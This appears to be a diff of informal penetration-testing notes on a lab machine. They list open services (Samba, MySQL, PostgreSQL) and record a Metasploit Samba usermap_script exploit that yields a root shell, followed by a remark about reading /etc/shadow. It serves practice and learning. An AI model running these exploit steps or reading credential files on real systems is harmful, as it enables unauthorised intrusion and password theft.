@@ -151,14 +151,27 @@ bruteforcing the password using hydra but authentication not enabled on the serv
  running nmap , searching edb and mfs couldn't verfy vulnerability for the exact version of the service
  
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+      445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 ----
  saerching exploit database for Samba getting me MSF module that returns a root shell 
  > use exploit/multi/samba/usermap_script
 > set RHOST 192.168.1.3
 > exploit 
 
- who ami >> root 
+ $whoami 
+
+ root 
  sudo/etc/shadow :D 
+ 
+ 3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+ ---
+ Could not find any vulnerabilities matching this version
+ 
+ 5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+---
+ 
+
+ 
+ 
  
  
